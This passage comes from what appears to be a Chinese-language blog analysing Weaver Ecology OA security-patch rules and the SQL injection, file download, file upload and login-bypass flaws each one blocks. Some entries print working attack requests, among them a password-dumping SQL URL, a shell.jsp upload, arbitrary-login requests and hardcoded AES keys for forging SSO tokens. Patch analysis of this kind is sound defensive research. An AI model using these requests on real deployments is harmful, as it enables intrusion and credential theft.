<h5 id="x2F-js-x2F-hrm-x2F-getdata-jsp"><a href="#x2F-js-x2F-hrm-x2F-getdata-jsp" class="headerlink" title="&#x2F;js&#x2F;hrm&#x2F;getdata.jsp"></a>&#x2F;js&#x2F;hrm&#x2F;getdata.jsp</h5><p>泛微8的任意SQL语句执行，9存在接口但不存在漏洞触发点<br><code>/js/hrm/getdata.jsp?cmd=getSelectAllId&amp;sql=select%20password%20as%20id%20from%20HrmResourceManager</code></p>
<h4 id="SecurityRuleDocLogQX"><a href="#SecurityRuleDocLogQX" class="headerlink" title="SecurityRuleDocLogQX"></a>SecurityRuleDocLogQX</h4><p>限制对路径<code>report/rpmodifydoc</code>和<code>docs/docs/docdownloadlog.jsp</code>访问</p>
<h5 id="report-x2F-rpmodifydoc-jsp"><a href="#report-x2F-rpmodifydoc-jsp" class="headerlink" title="report&#x2F;rpmodifydoc.jsp"></a>report&#x2F;rpmodifydoc.jsp</h5><p>多个SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215615179.png"></p>
<h5 id="docs-x2F-docs-x2F-docdownloadlog-jsp"><a href="#docs-x2F-docs-x2F-docdownloadlog-jsp" class="headerlink" title="docs&#x2F;docs&#x2F;docdownloadlog.jsp"></a>docs&#x2F;docs&#x2F;docdownloadlog.jsp</h5><p>E9无此路径</p>
<h4 id="SecurityRuleFileDownload"><a href="#SecurityRuleFileDownload" class="headerlink" title="SecurityRuleFileDownload"></a>SecurityRuleFileDownload</h4><p>空规则</p>
<h4 id="SecurityRuleFilesystem"><a href="#SecurityRuleFilesystem" class="headerlink" title="SecurityRuleFilesystem"></a>SecurityRuleFilesystem</h4><p>限制对<code>filesystem/</code>目录，结尾为<code>jsp</code>文件的访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215615411.png"></p>
<h4 id="SecurityRuleForbiddenswf-F8018"><a href="#SecurityRuleForbiddenswf-F8018" class="headerlink" title="SecurityRuleForbiddenswf_F8018"></a>SecurityRuleForbiddenswf_F8018</h4><p>限制对<code>swfupload_f8</code>路径下的<code>index.jsp</code>、<code>swfupload</code>和<code>/js/swfupload</code>、<code>/js/swfupload/</code>的路径访问,该路径在当前版本（10.24）已需要登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215615699.png"><br>此处补丁为限制后台漏洞利用</p>
<h4 id="SecurityRuleForbiddenTest017"><a href="#SecurityRuleForbiddenTest017" class="headerlink" title="SecurityRuleForbiddenTest017"></a>SecurityRuleForbiddenTest017</h4><p>限制对<code>test.jsp</code>等测试文件的访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215615972.png"></p>
<h4 id="SecurityRuleForbiddenUrlForE9"><a href="#SecurityRuleForbiddenUrlForE9" class="headerlink" title="SecurityRuleForbiddenUrlForE9"></a>SecurityRuleForbiddenUrlForE9</h4><p>增加<code>forbbiden-jsp-urls</code>XML文件配置项<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215616257.png"></p>
<h4 id="SecurityRuleForFormmodeAction"><a href="#SecurityRuleForFormmodeAction" class="headerlink" title="SecurityRuleForFormmodeAction"></a>SecurityRuleForFormmodeAction</h4><p>修了一堆SQL注入<br><code>weaver.formmode.servelt.BARcodeBuildAction</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215616534.png"></p>
<p><code>weaver.formmode.servelt.QRcodeBuildAction</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215616837.png"></p>
<p><code>weaver.formmode.servelt.CodeBuildAction</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215617082.png"></p>
<p><code>weaver.formmode.servelt.SelectItemAction</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215617349.png"></p>
<h4 id="SecurityRuleForGetDataList"><a href="#SecurityRuleForGetDataList" class="headerlink" title="SecurityRuleForGetDataList"></a>SecurityRuleForGetDataList</h4><p>限制对<code>mobile/plugin/networkdisk/getDataList.jsp</code>路径访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215617670.png"><br>简单分析后是一个任意用户登录+SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215617945.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215618200.png"></p>
<h4 id="SecurityRuleForUeditor"><a href="#SecurityRuleForUeditor" class="headerlink" title="SecurityRuleForUeditor"></a>SecurityRuleForUeditor</h4><p>限制对<code>ueditor/index.html</code>路径访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215618534.png"></p>
<h4 id="SecurityRuleGetBody"><a href="#SecurityRuleGetBody" class="headerlink" title="SecurityRuleGetBody"></a>SecurityRuleGetBody</h4><p>对<code>/weaver/</code>、<code>/api/</code>和<code>.jsp</code>文件的请求方式进行验证<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215618918.png"></p>
<h4 id="SecurityRuleLicense052"><a href="#SecurityRuleLicense052" class="headerlink" title="SecurityRuleLicense052"></a>SecurityRuleLicense052</h4><p>对<code>license</code>文件校验的类进行阻断<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215619234.png"></p>
<h4 id="SecurityRuleQueryPost"><a href="#SecurityRuleQueryPost" class="headerlink" title="SecurityRuleQueryPost"></a>SecurityRuleQueryPost</h4><p>对<code>*/operation.jsp</code>、<code>*/operate.jsp</code>的非post请求进行拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215619659.png"></p>
<h4 id="SecurityRuleRandomCode"><a href="#SecurityRuleRandomCode" class="headerlink" title="SecurityRuleRandomCode"></a>SecurityRuleRandomCode</h4><p>增加CSRF token<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215619925.png"></p>
<h4 id="SecurityRuleRteUploader"><a href="#SecurityRuleRteUploader" class="headerlink" title="SecurityRuleRteUploader"></a>SecurityRuleRteUploader</h4><p>限制对路径<code>/rte/uploader.jsp</code>的访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215620160.png"><br>在10.23及之前是一个后台任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215620439.png"><br>正常情况下报错500<strong>代码中少导入一个包导致，无法正常利用</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215622459.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rte/uploader.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.5.1</span><br><span class="line">Cookie: ecology_JSessionid=aaaxIu_Sw9fvE_wBUcbpy</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 184</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;shell.jsp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%out.println(&quot;X&quot;);%&gt;</span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215622697.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215622925.png"></p>
<h4 id="SecurityRuleUeditorMapForbbiden"><a href="#SecurityRuleUeditorMapForbbiden" class="headerlink" title="SecurityRuleUeditorMapForbbiden"></a>SecurityRuleUeditorMapForbbiden</h4><p>限制对<code>*/ueditor/dialogs/map/map.html</code>的访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215623139.png"></p>
<h4 id="SecurityRuleWhiteExtName"><a href="#SecurityRuleWhiteExtName" class="headerlink" title="SecurityRuleWhiteExtName"></a>SecurityRuleWhiteExtName</h4><p>对在<code>ext-names</code>列表内的后缀并且路径中含有<code>weaver</code>、<code>services</code>、<code>wsservice</code>、<code>api</code>进行放行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215623389.png"></p>
<h4 id="SecurityRuleWhiteIp030"><a href="#SecurityRuleWhiteIp030" class="headerlink" title="SecurityRuleWhiteIp030"></a>SecurityRuleWhiteIp030</h4><p>判断<code>no-security-page-list</code>列表是否为空，不为空则进行URL检测，为空则判断<code>security-page-list</code>列表是否为空，不为空则对访问的IP进行判断，在白名单内就放行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215623799.png"></p>
<h4 id="SkipSecurityCheckForLan"><a href="#SkipSecurityCheckForLan" class="headerlink" title="SkipSecurityCheckForLan"></a>SkipSecurityCheckForLan</h4><p>空规则</p>
<h3 id="Ecology9-00-2008-09-–-v10-27"><a href="#Ecology9-00-2008-09-–-v10-27" class="headerlink" title="Ecology9.00.2008.09 – v10.27"></a>Ecology9.00.2008.09 – v10.27</h3><p><code>9.00.1902.01</code>版本在升级到<code>9.00.2003.18</code>时会增加较多的class文件和功能，后续以该版本作为基底进行分析</p>
<h4 id="SecurityRuleCubeFormCheckVsql"><a href="#SecurityRuleCubeFormCheckVsql" class="headerlink" title="SecurityRuleCubeFormCheckVsql"></a>SecurityRuleCubeFormCheckVsql</h4><p>对<code>/api/cube/form/checkvsql</code>路径进行加黑，用户权限不足则拦截，是一个SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215624064.png"></p>
<h4 id="SecurityRuleFileDown054"><a href="#SecurityRuleFileDown054" class="headerlink" title="SecurityRuleFileDown054"></a>SecurityRuleFileDown054</h4><h5 id="x2F-api-x2F-hrm-x2F-pit-x2F-recordManager-x2F-downloadFile"><a href="#x2F-api-x2F-hrm-x2F-pit-x2F-recordManager-x2F-downloadFile" class="headerlink" title="&#x2F;api&#x2F;hrm&#x2F;pit&#x2F;recordManager&#x2F;downloadFile"></a>&#x2F;api&#x2F;hrm&#x2F;pit&#x2F;recordManager&#x2F;downloadFile</h5><p>任意文件下载，需要登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215624323.png"></p>
<h4 id="SecurityRuleFileDown055"><a href="#SecurityRuleFileDown055" class="headerlink" title="SecurityRuleFileDown055"></a>SecurityRuleFileDown055</h4><h5 id="api-x2F-edc-x2F-report-x2F-board-x2F-downEdcfiled"><a href="#api-x2F-edc-x2F-report-x2F-board-x2F-downEdcfiled" class="headerlink" title="api&#x2F;edc&#x2F;report&#x2F;board&#x2F;downEdcfiled"></a>api&#x2F;edc&#x2F;report&#x2F;board&#x2F;downEdcfiled</h5><p>一处任意文件下载，需要登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215624584.png"></p>
<h4 id="SecurityRuleFileDown056"><a href="#SecurityRuleFileDown056" class="headerlink" title="SecurityRuleFileDown056"></a>SecurityRuleFileDown056</h4><p>一处任意文件下载，需要登录</p>
<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-downfiledata"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-downfiledata" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;downfiledata"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;downfiledata</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215625038.png"></p>
<h4 id="SecurityRuleForbidden061"><a href="#SecurityRuleForbidden061" class="headerlink" title="SecurityRuleForbidden061"></a>SecurityRuleForbidden061</h4><p>一处后台文件上传</p>
<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-help-x2F-uploadxml"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-help-x2F-uploadxml" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;help&#x2F;uploadxml"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;help&#x2F;uploadxml</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215625260.png"></p>
<h4 id="SecurityRuleForLogOperation"><a href="#SecurityRuleForLogOperation" class="headerlink" title="SecurityRuleForLogOperation"></a>SecurityRuleForLogOperation</h4><h5 id="logMonitor-x2F-logoperation-jsp"><a href="#logMonitor-x2F-logoperation-jsp" class="headerlink" title="logMonitor&#x2F;logoperation.jsp"></a>logMonitor&#x2F;logoperation.jsp</h5><p>后台任意文件读取<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215625484.png"></p>
<h4 id="SecurityRuleMap"><a href="#SecurityRuleMap" class="headerlink" title="SecurityRuleMap"></a>SecurityRuleMap</h4><p>对<code>.js.map</code>后缀做拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215625694.png"></p>
<h4 id="SecurityRuleProtalWeb01"><a href="#SecurityRuleProtalWeb01" class="headerlink" title="SecurityRuleProtalWeb01"></a>SecurityRuleProtalWeb01</h4><h5 id="x2F-api-x2F-portal-x2F-materialLib-x2F-downloadFile"><a href="#x2F-api-x2F-portal-x2F-materialLib-x2F-downloadFile" class="headerlink" title="&#x2F;api&#x2F;portal&#x2F;materialLib&#x2F;downloadFile"></a>&#x2F;api&#x2F;portal&#x2F;materialLib&#x2F;downloadFile</h5><p>授权后的任意文件下载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215625896.png"></p>
<h4 id="SecurityRuleTempData"><a href="#SecurityRuleTempData" class="headerlink" title="SecurityRuleTempData"></a>SecurityRuleTempData</h4><p>一处SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215626142.png"></p>
<h4 id="SecurityRuleUser059"><a href="#SecurityRuleUser059" class="headerlink" title="SecurityRuleUser059"></a>SecurityRuleUser059</h4><p><code>mobile/plugin/contract/base/getHrmInfo.jsp</code>一处登录后越权查其他人信息的地方<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215626371.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215626639.png"></p>
<h3 id="Ecology9-00-2011-09-–-v10-32"><a href="#Ecology9-00-2011-09-–-v10-32" class="headerlink" title="Ecology9.00.2011.09 – v10.32"></a>Ecology9.00.2011.09 – v10.32</h3><p><code>10.30~10.31</code>补丁密码没有，直接找新的包重装</p>
<h4 id="SecurityRuelForRest"><a href="#SecurityRuelForRest" class="headerlink" title="SecurityRuelForRest"></a>SecurityRuelForRest</h4><h5 id="x2F-rest-x2F-ofs-x2F"><a href="#x2F-rest-x2F-ofs-x2F" class="headerlink" title="&#x2F;rest&#x2F;ofs&#x2F;"></a>&#x2F;rest&#x2F;ofs&#x2F;</h5><p>限制对该路径访问 <del>似乎是个restapi？</del><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215626863.png"></p>
<h5 id="x2F-login-x2F-verifyrtxclientlogin-jsp"><a href="#x2F-login-x2F-verifyrtxclientlogin-jsp" class="headerlink" title="&#x2F;login&#x2F;verifyrtxclientlogin.jsp"></a>&#x2F;login&#x2F;verifyrtxclientlogin.jsp</h5><p>一个任意用户登录，本地测试时直接跳到<code>notice/noright.jsp</code>，似乎有前置条件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215627100.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /login/VerifyRtxClientLogin.jsp?loginid=3 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Referer: http://10.10.10.38/login/RTXClientLoginOA.jsp</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="x2F-login-x2F-verifyssologin-jsp"><a href="#x2F-login-x2F-verifyssologin-jsp" class="headerlink" title="&#x2F;login&#x2F;verifyssologin.jsp"></a>&#x2F;login&#x2F;verifyssologin.jsp</h5><p>一处任意用户登录，需要知道用户名，仅限非<code>sysadmin</code>帐号,<code>para</code>参数格式<code>AES(&quot;gopage#username&quot;)</code>，加密用的<code>aeskey</code>（10.32版本）<code>ro781s51</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215627346.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215627602.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login/VerifySSoLogin.jsp?para=4218AB9C7358647C14576CF71F3C6974 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://10.10.10.38/rest/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="SecurityRuleDot0180"><a href="#SecurityRuleDot0180" class="headerlink" title="SecurityRuleDot0180"></a>SecurityRuleDot0180</h4><p>对路径<code>/api/ec/tool/wf/releasediff/import/check</code>进行拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215627865.png"><br>是一处文件解压操作 需要配合文件上传进行利用，需要登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215628207.png"></p>
<h4 id="SecurityRuleFieldBrowser1201"><a href="#SecurityRuleFieldBrowser1201" class="headerlink" title="SecurityRuleFieldBrowser1201"></a>SecurityRuleFieldBrowser1201</h4><p>修复一处SQL注入 对<code>workflow/selectItem/fieldBrowser.jsp</code>、<code>workflow/workflow/fieldBrowser.jsp</code>进行拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215628537.png"></p>
<h4 id="SecurityRuleSso45"><a href="#SecurityRuleSso45" class="headerlink" title="SecurityRuleSso45"></a>SecurityRuleSso45</h4><p>没看懂这东西检测了个啥 涉及到的文件<code>/login/verifyrtxlogin.jsp</code>数据库的操作是预编译的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215628764.png"></p>
<h3 id="Ecology9-00-2011-09-–-v10-39"><a href="#Ecology9-00-2011-09-–-v10-39" class="headerlink" title="Ecology9.00.2011.09 – v10.39"></a>Ecology9.00.2011.09 – v10.39</h3><h4 id="SecurityRuelForSQL10413"><a href="#SecurityRuelForSQL10413" class="headerlink" title="SecurityRuelForSQL10413"></a>SecurityRuelForSQL10413</h4><h5 id="x2F-mobilemode-x2F-action-jsp【需要登录】"><a href="#x2F-mobilemode-x2F-action-jsp【需要登录】" class="headerlink" title="&#x2F;mobilemode&#x2F;action.jsp【需要登录】"></a>&#x2F;mobilemode&#x2F;action.jsp【需要登录】</h5><p>限制了反射调用任意类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215628991.png"><br>根据<code>RunSQL</code>关键字全局搜了下，符合条件的有<code>com/api/mobilemode/web/mobile/service/MobileCommonAction</code>和<code>com/weaver/formmodel/mobile/jscode/servlet/JSCodeAction</code>，前者可以执行任意SQL语句<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215629278.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobilemode/Action.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://10.10.10.38</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaapCDhzF1iSL5QUj01qy; JSESSIONID=aaapCDhzF1iSL5QUj01qy; loginidweaver=1; languageidweaver=7; loginuuids=1; __randcode__=28f6c6ec-ae38-4b7a-bfb2-4ad70727cb14</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 183</span><br><span class="line"></span><br><span class="line">invoker=com.api.mobilemode.web.mobile.service.MobileCommonAction&amp;action=runSQL&amp;content=21F5D4410781816F60D6B07124BF9B9B43FAC505437EDDD5B18D7CF2AAD093653F4C6B35BEE9A02A516D404390F98E23</span><br></pre></td></tr></table></figure>
<h5 id="x2F-api-x2F-integration-x2F-simplesso-x2F-getuserbyworkcode"><a href="#x2F-api-x2F-integration-x2F-simplesso-x2F-getuserbyworkcode" class="headerlink" title="&#x2F;api&#x2F;integration&#x2F;simplesso&#x2F;getuserbyworkcode"></a>&#x2F;api&#x2F;integration&#x2F;simplesso&#x2F;getuserbyworkcode</h5><p>一处任意用户登录（低权限），加密算法<code>AES/ECB/PKCS5Padding</code>，密钥<code>rtdl_20190408_00</code>，post传参workcode<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215629613.png"></p>
<h4 id="SecurityRule051-1"><a href="#SecurityRule051-1" class="headerlink" title="SecurityRule051"></a>SecurityRule051</h4><p>对可能造成删库的文件做访问限制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215629936.png"></p>
<h4 id="SecurityRule16"><a href="#SecurityRule16" class="headerlink" title="SecurityRule16"></a>SecurityRule16</h4><p>限制敏感目录、敏感文件访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215630511.png"></p>
<h4 id="SecurityRule24FormActionJsp-1"><a href="#SecurityRule24FormActionJsp-1" class="headerlink" title="SecurityRule24FormActionJsp"></a>SecurityRule24FormActionJsp</h4><p>限制了对2个文件的未授权访问，<del>似乎是注入</del><code>/mobilemode/formcomponentaction.jsp</code>、<code>/mobilemode/browser/hrmbrowser.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215630989.png"></p>
<h4 id="SecurityRule34-1"><a href="#SecurityRule34-1" class="headerlink" title="SecurityRule34"></a>SecurityRule34</h4><p>集群模式下如果<code>maincontrolIP</code>为空则拦截对<code>clusterupgrade</code>的请求<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215631274.png"></p>
<h4 id="SecurityRule35-1"><a href="#SecurityRule35-1" class="headerlink" title="SecurityRule35"></a>SecurityRule35</h4><p><code>profiler/jstack.jsp</code> 任意文件下载，<code>cookie</code>参数<code>profilerCookie</code>的值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215631515.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215631831.png"></p>
<h4 id="SecurityRule36-1"><a href="#SecurityRule36-1" class="headerlink" title="SecurityRule36"></a>SecurityRule36</h4><p>限制对<code>templetecheck</code>目录访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215632152.png"></p>
